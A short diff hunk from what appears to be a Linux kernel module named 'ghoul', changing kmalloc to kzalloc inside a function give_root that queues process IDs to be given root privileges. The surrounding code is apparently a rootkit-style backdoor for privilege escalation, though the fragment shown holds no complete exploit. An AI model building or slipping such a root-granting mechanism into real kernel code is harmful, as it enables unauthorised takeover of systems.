@@ -40,7 +40,7 @@ void give_root(int pid)
     
     // add PID to list of PIDs waiting for root
     pr_info("ghoul: scheduled request to give root to PID %d\n", pid);
-    pid_entry = kmalloc(sizeof(struct pid_list), GFP_KERNEL);
+    pid_entry = kzalloc(sizeof(struct pid_list), GFP_KERNEL);
     pid_entry->pid = pid;
     list_add_tail(&pid_entry->list, &pids_waiting_for_root);
 }
